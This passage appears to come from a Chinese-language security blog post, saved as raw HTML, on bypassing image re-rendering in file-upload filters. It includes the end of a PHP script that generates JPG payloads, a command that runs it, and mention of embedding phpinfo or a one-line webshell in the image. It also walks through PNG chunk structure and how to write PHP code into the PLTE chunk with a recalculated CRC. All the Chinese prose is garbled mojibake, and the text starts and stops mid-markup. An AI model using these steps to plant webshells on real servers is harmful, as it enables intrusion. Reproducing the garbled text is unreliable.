punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.42.52.png" style="zoom:50%;"><p>æ³¨ï¼šç”±äºjpgå›¾ç‰‡æ˜“æŸï¼Œå¯¹å›¾ç‰‡çš„é€‰å–è¦æ±‚å¾ˆé«˜ï¼Œå¾ˆå®¹æ˜“åˆ¶ä½œå¤±è´¥ï¼Œéœ€è¦å¤šé€‰å–å‡ å¼ å›¾ç‰‡è¿›è¡Œç”Ÿæˆã€‚</p><p>payloadåœ¨25è¡Œçš„ä½ç½®ï¼Œå¯ä»¥æ›´æ”¹ä¸ºyjhæœ¨é©¬ï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.44.30.png" style="zoom:40%;"><h2 id="4-2-åˆ¶ä½œæœ¨é©¬"><a href="#4-2-åˆ¶ä½œæœ¨é©¬" class="headerlink" title="4.2 åˆ¶ä½œæœ¨é©¬"></a>4.2 åˆ¶ä½œæœ¨é©¬</h2><ul><li>å‡†å¤‡ä¸€ä¸ªèƒ½ä¸Šä¼ æˆåŠŸçš„æ­£å¸¸çš„jpgå›¾ç‰‡</li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/duigou.jpg" alt="duigou" style="zoom:50%;"><p>ç»è¿‡æµ‹è¯•å‘ç°èƒ½ä¸Šä¼ æˆåŠŸï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2010.13.52.png" style="zoom:40%;"><ul><li>ç”Ÿæˆå›¾ç‰‡æœ¨é©¬</li></ul><p>ä½¿ç”¨ä¸Šé¢åˆ›å»ºçš„è„šæœ¬ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php generate_jpg_muma.php duigou.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2010.15.47.png" style="zoom:50%;"><p>ç”Ÿæˆäº†åç§°ä¸ºpayload_duigou.jpgçš„å›¾ç‰‡æœ¨é©¬ï¼Œå¹¶ä¸”ç”¨010editorå¯ä»¥çœ‹åˆ°åŒ…å«æœ‰<code>&lt;?phpinfo()?&gt;</code>çš„ä»£ç ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2010.16.49.png" style="zoom:50%;"><h2 id="4-3-ä¸Šä¼ å›¾ç‰‡æœ¨é©¬"><a href="#4-3-ä¸Šä¼ å›¾ç‰‡æœ¨é©¬" class="headerlink" title="4.3 ä¸Šä¼ å›¾ç‰‡æœ¨é©¬"></a>4.3 ä¸Šä¼ å›¾ç‰‡æœ¨é©¬</h2><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2010.17.34.png" style="zoom:50%;"><p>ä½†æ˜¯æ–‡ä»¶ä¸Šä¼ å¤±è´¥äº†ã€‚è¯´æ˜å›¾ç‰‡ç»“æ„è¢«ç ´åäº†ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2010.18.25.png" style="zoom:40%;"><p>éœ€è¦æ›´æ¢å›¾ç‰‡å†å°è¯•ä¸€ä¸‹ã€‚</p><h2 id="5-5-æ›´æ¢å›¾ç‰‡"><a href="#5-5-æ›´æ¢å›¾ç‰‡" class="headerlink" title="5.5 æ›´æ¢å›¾ç‰‡"></a>5.5 æ›´æ¢å›¾ç‰‡</h2><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/smile.jpg" style="zoom:80%;"><p>é‡å¤ä¸Šè¿°æ“ä½œåˆ¶ä½œå¦‚ä¸‹å›¾ç‰‡æœ¨é©¬ï¼ˆå›¾ç‰‡å¯ä»¥æ˜¾ç¤ºï¼‰ï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/payload_smile.jpg" alt="payload_smile" style="zoom:50%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2010.28.35.png" style="zoom:50%;"><p>ä¸Šä¼ ï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2010.29.24.png" style="zoom:50%;"><p>ä½†æ˜¯è¿˜æ˜¯ä¸Šä¼ å¤±è´¥ã€‚</p><h2 id="å¤±è´¥"><a href="#å¤±è´¥" class="headerlink" title="å¤±è´¥"></a>å¤±è´¥</h2><p>åç»­é€‰æ‹©äº†çº¦20å¼ ç…§ç‰‡ï¼Œè¦ä¹ˆæ˜¯ç»“æ„è¢«ç ´åæ— æ³•ä¸Šä¼ ï¼Œè¦ä¹ˆå°±æ˜¯ä¸Šä¼ ä¹‹åç»è¿‡äºŒæ¬¡æ¸²æŸ“ä¹‹åæœ¨é©¬å¤±æ•ˆã€‚</p><p>è€Œä¸”ç”¨ä¼ ç»Ÿçš„å¯¹æ¯”å·®å¼‚ç„¶åæ’å…¥æœ¨é©¬çš„æ–¹æ³•ä¸å¥æ•ˆï¼Œå› ä¸ºç»è¿‡äºŒæ¬¡æ¸²æŸ“ä¹‹åä¸å˜çš„åœ°æ–¹å¾ˆå°‘ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2011.05.14.png" style="zoom:50%;"><p>æœ€ç»ˆä¹Ÿæ²¡èƒ½å®ŒæˆjpgäºŒæ¬¡æ¸²æŸ“çš„ç»•è¿‡ï¼Œåˆ¶ä½œå¯ç”¨æœ¨é©¬çš„éš¾åº¦æœ‰ç‚¹é«˜ã€‚</p><h1 id="äº”ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«pngå›¾ç‰‡æœ¨é©¬"><a href="#äº”ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«pngå›¾ç‰‡æœ¨é©¬" class="headerlink" title="äº”ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«pngå›¾ç‰‡æœ¨é©¬"></a>äº”ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«pngå›¾ç‰‡æœ¨é©¬</h1><h2 id="5-1-pngå›¾ç‰‡ç»“æ„æ¦‚è¿°"><a href="#5-1-pngå›¾ç‰‡ç»“æ„æ¦‚è¿°" class="headerlink" title="5.1 pngå›¾ç‰‡ç»“æ„æ¦‚è¿°"></a>5.1 pngå›¾ç‰‡ç»“æ„æ¦‚è¿°</h2><h3 id="5-1-1-æ–‡ä»¶å¤´"><a href="#5-1-1-æ–‡ä»¶å¤´" class="headerlink" title="5.1.1 æ–‡ä»¶å¤´"></a>5.1.1 æ–‡ä»¶å¤´</h3><ul><li><strong>8å­—èŠ‚</strong>ï¼šæ ‡è¯†PNGæ–‡ä»¶ï¼Œå›ºå®šä¸º<code>\x89PNG\r\n\x1a\n</code>ã€‚</li></ul><h3 id="5-1-2-æ•°æ®å—ï¼ˆChunksï¼‰"><a href="#5-1-2-æ•°æ®å—ï¼ˆChunksï¼‰" class="headerlink" title="5.1.2  æ•°æ®å—ï¼ˆChunksï¼‰"></a>5.1.2  æ•°æ®å—ï¼ˆChunksï¼‰</h3><p>PNGæ–‡ä»¶ç”±å¤šä¸ªæ•°æ®å—ç»„æˆï¼Œæ•°æ®å—æœ‰ä»¥ä¸‹ç±»å‹ï¼š</p><h4 id="1ï¼‰å…³é”®æ•°æ®å—"><a href="#1ï¼‰å…³é”®æ•°æ®å—" class="headerlink" title="1ï¼‰å…³é”®æ•°æ®å—"></a>1ï¼‰å…³é”®æ•°æ®å—</h4><ul><li><strong>IHDR</strong>ï¼ˆå›¾åƒå¤´ï¼‰ï¼šåŒ…å«å®½åº¦ã€é«˜åº¦ã€é¢œè‰²ç±»å‹ç­‰åŸºæœ¬ä¿¡æ¯ã€‚</li><li><strong>PLTE</strong>ï¼ˆè°ƒè‰²æ¿ï¼‰ï¼šå®šä¹‰ç´¢å¼•é¢œè‰²å›¾åƒä¸­çš„é¢œè‰²ã€‚</li><li><strong>IDAT</strong>ï¼ˆå›¾åƒæ•°æ®ï¼‰ï¼šå­˜å‚¨å®é™…çš„å›¾åƒæ•°æ®ï¼Œå¯èƒ½åˆ†å¤šä¸ªå—ã€‚</li><li><strong>IEND</strong>ï¼ˆå›¾åƒç»“æŸï¼‰ï¼šæ ‡è¯†å›¾åƒæ•°æ®ç»“æŸã€‚æ ‡è¯†PNGæ–‡ä»¶ç»“æŸï¼Œæ— æ•°æ®å­—æ®µï¼ŒCRCå›ºå®šä¸º<code>AE 42 60 82</code>ã€‚</li></ul><h4 id="2ï¼‰è¾…åŠ©æ•°æ®å—"><a href="#2ï¼‰è¾…åŠ©æ•°æ®å—" class="headerlink" title="2ï¼‰è¾…åŠ©æ•°æ®å—"></a>2ï¼‰è¾…åŠ©æ•°æ®å—</h4><ul><li><strong>tEXt</strong>ï¼ˆæ–‡æœ¬ä¿¡æ¯ï¼‰ï¼šå­˜å‚¨æ–‡æœ¬æ•°æ®ï¼Œå¦‚ä½œè€…ã€æè¿°ç­‰ã€‚</li><li><strong>iTXt</strong>ï¼ˆå›½é™…åŒ–æ–‡æœ¬ï¼‰ï¼šæ”¯æŒUnicodeçš„æ–‡æœ¬ä¿¡æ¯ã€‚</li><li><strong>zTXt</strong>ï¼ˆå‹ç¼©æ–‡æœ¬ï¼‰ï¼šå‹ç¼©å­˜å‚¨çš„æ–‡æœ¬ä¿¡æ¯ã€‚</li><li><strong>bKGD</strong>ï¼ˆèƒŒæ™¯é¢œè‰²ï¼‰ï¼šå®šä¹‰é»˜è®¤èƒŒæ™¯è‰²ã€‚</li><li><strong>pHYs</strong>ï¼ˆç‰©ç†å°ºå¯¸ï¼‰ï¼šæŒ‡å®šåƒç´ çš„ç‰©ç†å°ºå¯¸ã€‚</li><li><strong>tIME</strong>ï¼ˆæœ€åä¿®æ”¹æ—¶é—´ï¼‰ï¼šè®°å½•æœ€åä¿®æ”¹æ—¶é—´ã€‚</li></ul><h3 id="5-1-3-æ•°æ®å—ç»“æ„"><a href="#5-1-3-æ•°æ®å—ç»“æ„" class="headerlink" title="5.1.3 æ•°æ®å—ç»“æ„"></a>5.1.3 æ•°æ®å—ç»“æ„</h3><p>æ¯ä¸ªæ•°æ®å—åŒ…å«ä»¥ä¸‹å­—æ®µï¼š</p><ul><li><strong>Length</strong>ï¼ˆ4å­—èŠ‚ï¼‰ï¼šæ•°æ®å­—æ®µçš„é•¿åº¦ã€‚</li><li><strong>Chunk Type</strong>ï¼ˆ4å­—èŠ‚ï¼‰ï¼šæ ‡è¯†å—ç±»å‹ï¼Œå¦‚IHDRã€IDATç­‰ã€‚</li><li><strong>Chunk Data</strong>ï¼ˆå¯å˜é•¿åº¦ï¼‰ï¼šå®é™…æ•°æ®ã€‚</li><li><strong>CRC</strong>ï¼ˆ4å­—èŠ‚ï¼‰ï¼šå¾ªç¯å†—ä½™æ ¡éªŒï¼Œç¡®ä¿æ•°æ®å®Œæ•´æ€§ã€‚</li></ul><table><thead><tr><th>å­—æ®µå</th><th>å¤§å°ï¼ˆå•ä½å­—èŠ‚ï¼‰</th><th>æè¿°</th></tr></thead><tbody><tr><td>Lengthï¼ˆé•¿åº¦ï¼‰</td><td>4</td><td>æŒ‡å®šæ•°æ®å—ä¸­çš„æ•°æ®é•¿åº¦</td></tr><tr><td>Chunk Type Codeï¼ˆæ•°æ®å—ç±»å‹ç ï¼‰</td><td>4</td><td>æ•°æ®å—ç±»å‹ã€ä¾‹å¦‚ï¼šIHDRã€PLTEã€IDATç­‰</td></tr><tr><td>Chunk Dataï¼ˆæ•°æ®å—æ•°æ®ï¼‰</td><td>Length</td><td>å­˜å‚¨çš„å®é™…æ•°æ®</td></tr><tr><td>CRCï¼ˆå¾ªç¯å†—ä½™æ ¡éªŒç ï¼‰</td><td>4</td><td>å¾ªç¯å†—ä½™æ ¡éªŒç </td></tr></tbody></table><p>CRC(cyclic redundancy check)åŸŸä¸­çš„å€¼æ˜¯å¯¹Chunk Type CodeåŸŸå’ŒChunk DataåŸŸä¸­çš„æ•°æ®è¿›è¡Œè®¡ç®—å¾—åˆ°çš„ã€‚CRCå…·ä½“ç®—æ³•å®šä¹‰åœ¨ISO 3309å’ŒITU-T V.42ä¸­ï¼Œå…¶å€¼æŒ‰ä¸‹é¢çš„CRCç ç”Ÿæˆå¤šé¡¹å¼è¿›è¡Œè®¡ç®—ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç¤ºä¾‹ç»“æ„"><a href="#ç¤ºä¾‹ç»“æ„" class="headerlink" title="ç¤ºä¾‹ç»“æ„"></a>ç¤ºä¾‹ç»“æ„</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æ–‡ä»¶å¤´ <span class="token punctuation">(</span><span class="token number">8</span>å­—èŠ‚<span class="token punctuation">)</span>IHDRå— <span class="token punctuation">(</span><span class="token number">25</span>å­—èŠ‚<span class="token punctuation">)</span>PLTEå— <span class="token punctuation">(</span>å¯é€‰<span class="token punctuation">)</span>IDATå— <span class="token punctuation">(</span>ä¸€ä¸ªæˆ–å¤šä¸ª<span class="token punctuation">)</span>IENDå— <span class="token punctuation">(</span><span class="token number">12</span>å­—èŠ‚<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-2-åˆ†ææ•°æ®å—"><a href="#5-2-åˆ†ææ•°æ®å—" class="headerlink" title="5.2 åˆ†ææ•°æ®å—"></a>5.2 åˆ†ææ•°æ®å—</h2><h3 id="5-3-1-IHDR"><a href="#5-3-1-IHDR" class="headerlink" title="5.3.1 IHDR"></a>5.3.1 IHDR</h3><blockquote><p>æ•°æ®å—<code>IHDR(header chunk)</code>ï¼šå®ƒåŒ…å«æœ‰<code>PNGæ–‡ä»¶</code>ä¸­å­˜å‚¨çš„<code>å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯</code>ï¼Œå¹¶è¦ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨<code>PNGæ•°æ®æµ</code>ä¸­ï¼Œè€Œä¸”ä¸€ä¸ª<code>PNGæ•°æ®æµ</code>ä¸­åªèƒ½æœ‰ä¸€ä¸ª<code>æ–‡ä»¶å¤´æ•°æ®å—</code>ã€‚</p></blockquote><p>æ–‡ä»¶å¤´æ•°æ®å—ç”±13å­—èŠ‚ç»„æˆï¼Œå®ƒçš„æ ¼å¼å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2017.15.18.png" style="zoom:50%;"><h3 id="5-3-2-PLTE"><a href="#5-3-2-PLTE" class="headerlink" title="5.3.2 PLTE"></a>5.3.2 PLTE</h3><p><code>è°ƒè‰²æ¿PLTEæ•°æ®å—</code>æ˜¯è¾…åŠ©æ•°æ®å—,å¯¹äºç´¢å¼•å›¾åƒï¼Œè°ƒè‰²æ¿ä¿¡æ¯æ˜¯å¿…é¡»çš„ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²ç´¢å¼•ä»<code>0</code>å¼€å§‹ç¼–å·ï¼Œç„¶åæ˜¯<code>1ã€2â€¦â€¦</code>ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²æ•°<code>ä¸èƒ½è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ï¼ˆå¦‚å›¾åƒè‰²æ·±ä¸º4çš„æ—¶å€™ï¼Œè°ƒè‰²æ¿ä¸­çš„é¢œè‰²æ•°ä¸å¯ä»¥è¶…è¿‡2^4=16ï¼‰</code>ï¼Œå¦åˆ™ï¼Œè¿™å°†å¯¼è‡´PNGå›¾åƒä¸åˆæ³•ã€‚</p><p>PLTEæ•°æ®å—çš„ç»“æ„</p><ol><li><strong>Lengthï¼ˆ4å­—èŠ‚ï¼‰</strong>ï¼šæŒ‡ç¤ºæ•°æ®å­—æ®µçš„é•¿åº¦ã€‚</li><li><strong>Chunk Typeï¼ˆ4å­—èŠ‚ï¼‰</strong>ï¼šæ ‡è¯†å—ç±»å‹ï¼Œå›ºå®šä¸º<code>PLTE</code>ã€‚</li><li><strong>Chunk Dataï¼ˆå¯å˜é•¿åº¦ï¼‰</strong>ï¼šå­˜å‚¨è°ƒè‰²æ¿æ•°æ®ï¼Œæ¯ä¸ªé¢œè‰²ç”±3å­—èŠ‚ï¼ˆRGBï¼‰è¡¨ç¤ºã€‚</li><li><strong>CRCï¼ˆ4å­—èŠ‚ï¼‰</strong>ï¼šæ ¡éªŒå€¼ï¼Œç”¨äºéªŒè¯æ•°æ®å—çš„å®Œæ•´æ€§ã€‚</li></ol><p>CRCæ ¡éªŒå€¼çš„ä½ç½®</p><ul><li>CRCæ ¡éªŒå€¼ç´§è·Ÿåœ¨<strong>Chunk Data</strong>ä¹‹åï¼Œæ˜¯PLTEæ•°æ®å—çš„æœ€å4å­—èŠ‚ã€‚</li><li>CRCçš„è®¡ç®—èŒƒå›´åŒ…æ‹¬<strong>Chunk Typeï¼ˆPLTEï¼‰**å’Œ**Chunk Data**ï¼Œä½†ä¸åŒ…æ‹¬</strong>Length**å­—æ®µã€‚</li></ul><h3 id="5-3-3-IDAT"><a href="#5-3-3-IDAT" class="headerlink" title="5.3.3 IDAT"></a>5.3.3 IDAT</h3><p><code>å›¾åƒæ•°æ®å—IDAT(image data chunk)</code>ï¼šå®ƒå­˜å‚¨<code>å®é™…çš„æ•°æ®</code>ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«<code>å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—</code>ã€‚<code>IDAT</code>å­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯ï¼Œå› æ­¤ï¼Œå¦‚æœèƒ½å¤Ÿäº†è§£<code>IDAT</code>çš„ç»“æ„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”Ÿæˆ<code>PNGå›¾åƒ</code>ã€‚</p><p>IDATæ•°æ®å—ç»“æ„</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.22.57.png" style="zoom:50%;"><h3 id="5-3-4-IEND"><a href="#5-3-4-IEND" class="headerlink" title="5.3.4 IEND"></a>5.3.4 IEND</h3><p>å›¾åƒç»“æŸæ•°æ®IEND(image trailer chunk)ï¼šå®ƒç”¨æ¥æ ‡è®°PNGæ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œå¹¶ä¸”å¿…é¡»è¦æ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚å¦‚æœæˆ‘ä»¬ä»”ç»†è§‚å¯ŸPNGæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œæ–‡ä»¶çš„ç»“å°¾12ä¸ªå­—ç¬¦çœ‹èµ·æ¥æ€»åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š<br>â€ƒâ€ƒ00 00 00 00 49 45 4E 44 AE 42 60 82</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2017.17.15.png" style="zoom:50%;"><h2 id="5-3-åœ¨PNGå›¾ç‰‡ä¸­å†™å…¥phpä»£ç çš„å‡ ç§æ–¹å¼"><a href="#5-3-åœ¨PNGå›¾ç‰‡ä¸­å†™å…¥phpä»£ç çš„å‡ ç§æ–¹å¼" class="headerlink" title="5.3 åœ¨PNGå›¾ç‰‡ä¸­å†™å…¥phpä»£ç çš„å‡ ç§æ–¹å¼"></a>5.3 åœ¨PNGå›¾ç‰‡ä¸­å†™å…¥phpä»£ç çš„å‡ ç§æ–¹å¼</h2><h3 id="5-3-1-åœ¨PLTEæ•°æ®å—å†™å…¥phpä»£ç "><a href="#5-3-1-åœ¨PLTEæ•°æ®å—å†™å…¥phpä»£ç " class="headerlink" title="5.3.1 åœ¨PLTEæ•°æ®å—å†™å…¥phpä»£ç "></a>5.3.1 åœ¨PLTEæ•°æ®å—å†™å…¥phpä»£ç </h3><p>phpåº•å±‚åœ¨å¯¹PLTEæ•°æ®å—éªŒè¯çš„æ—¶å€™ï¼Œä¸»è¦è¿›è¡Œäº†CRCæ ¡éªŒã€‚æ‰€ä»¥å¯ä»¥åœ¨chunk dataåŸŸæ’å…¥phpä»£ç ï¼Œç„¶åé‡æ–°è®¡ç®—ç›¸åº”çš„crcå€¼å¹¶ä¿®æ”¹å³å¯ã€‚<br>â€ƒâ€ƒè¿™ç§æ–¹å¼åªé’ˆå¯¹ç´¢å¼•å½©è‰²å›¾åƒçš„pngå›¾ç‰‡æ‰æœ‰æ•ˆï¼Œåœ¨é€‰å–pngå›¾ç‰‡æ—¶å¯æ ¹æ®IHDRæ•°æ®å—çš„color typeè¾¨åˆ«03ä¸ºç´¢å¼•å½©è‰²å›¾åƒã€‚</p><ul><li>æŸ¥çœ‹<code>pngå›¾ç‰‡</code>çš„<code>IHDRæ•°æ®å—</code>çš„<code>color type</code>æ˜¯å¦ä¸º<code>03</code>ï¼Œä¸‹å›¾å¯ä»¥çœ‹å‡º<code>26.png</code>çš„<code>color type</code>ç´¢å¼•ä¸º<code>03</code>ï¼Œæ˜¯ç´¢å¼•å½©è‰²å›¾åƒï¼š</li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2017.20.30.png" style="zoom:50%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/smile.png" alt="smile" style="zoom:50%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2017.21.37.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°color typeçš„å€¼ä¸º3.</p><ul><li>åœ¨PLTEæ•°æ®å—å†™å…¥phpä»£ç ï¼Œå¹¶ä¿å­˜ï¼š</li></ul><p><code>smile_PLTE_php_yjh_sxk.png</code></p><p>æ’å…¥æœ¨é©¬å‰ï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.01.31.png" alt="æ’å…¥æœ¨é©¬å‰" style="zoom:50%;"><p>æ’å…¥æœ¨é©¬åï¼š</p><img 